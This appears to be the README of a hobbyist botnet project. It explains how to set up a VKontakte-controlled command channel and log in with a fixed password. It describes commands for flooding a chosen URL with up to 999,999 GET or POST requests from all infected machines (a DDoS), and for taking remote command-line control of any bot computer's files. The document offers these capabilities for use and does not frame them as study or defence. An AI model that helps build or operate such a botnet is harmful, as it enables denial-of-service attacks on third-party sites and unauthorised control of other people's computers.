# BotNET
[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FReedus0%2FBotNET.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2FReedus0%2FBotNET?ref=badge_shield)


BotNET - is program that can do GET and POST request on command. With this program you can create your own BotNET.

# What's new in the last version 1.3?
In 1.3 version BotNET was fully reworked and moved to new messenger: Telegram. 

# Installing 

To use BotNET you need to install next libraries:
```
vk_api
requests
getuser
```

To make BotNET work you need create a public-group in social network "Vkontakte". Then you copy community token in section "Work with API" in community settings ad paste it in BotNET.py in variable "token"

Example:
```
from getpass import getuser

token = '4691d8f6706204dafcf4410fb911a1e515b2dc5345623asw42343421ret3441c28d91003cfce' # <- Paste here

vk_session = VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)
```

Next you need to specify your "VKontakte" id. To find it you need go to your page and copy numbers after "id" in link 

Example:
```
https://vk.com/id358410283 # You need copy "358410283"
```
Than you paste it into peer_id in function "message"

Example:
```
def message(message):
    vk.messages.send(
        peer_id = '358410283', # <- here
        message = message,
        random_id = get_random_id(),
    )
```

# Functional 

To start work with BotNET you need to run BotNET.py and write message to your community in "VKontakte" with text: your username + 16080305 (its password that can be changed in BotNET.py) where your username is name of your computer.

Example:
```
Reeuds 16080305
```

When you write your username + password community write you that you logined in and you can use commands.

# Commands

Here's be all comands that your BotNET can do
```
DDoS - enter in POST/GET requests panel
Check - check for new users that now have runned BotNET.
online - show all users who have BotNET running right now
```
Below be more advanced description

# DDoS

In POST/GET requests panel you can see 2 type of requests POST and GET(captain obvious)
```
1. To make GET requests you need write "GET" after entering in requests panel.
2. When you write "GET" you need to paste link to which requests will be made.
3. Next you writing link you need to write count of requests(from 1 to 999999)
```
After writing all information BotNET being do requests.

With POST requests be a bit harder
```
1. To make POST requests you need write "POST" after entering in requests panel.
2. After writing link you need to write "data" of POST request(data is cortage of information that request transmitt to server).
3. Next step you need again write count of requests(from 1 to 999999)
```
After writing all information BotNET beging do requests.

After end of sending requests you need type "Выход" to exit(if you done POST requests you need type "Выход" 2 times).

# Check 

Where you type "Check" to your BotNET him check for new users that now have run BotNET.

What it meens?

You user and you logined as admin. When you type "Check" all other users become online.
When you enter in requests panel other users enter in it too. If you begin sending requests as admin, all other users negin it too.

# online 

That's very easy.

When you type "online" to you community - all users who have run BotNET right now is shown you

# cmd

cmd is new command that has appeared in BotNET from 1.2 version. This command allows you control cmd of chosen bot. It's very helpful when you need to do something with files of your bot or when you want to have a little fun :).

cmd has a subcommand that called cd. You can enter in cmd mode by the command: "Bot name + cmd".

It's looks like:
```
Reedus cmd
```
When you are in the cmd mode you can turn cd to change current directory. After you write cd - BotNET asks you to choose directory which you want to get into. 
You can check all directories by turning into cmd command called "dir". 
After this command you will know all directories in the folder.
It's allows you to manipulate with all files on bot's computer.


        

## License
[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FReedus0%2FBotNET.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2FReedus0%2FBotNET?ref=badge_large)

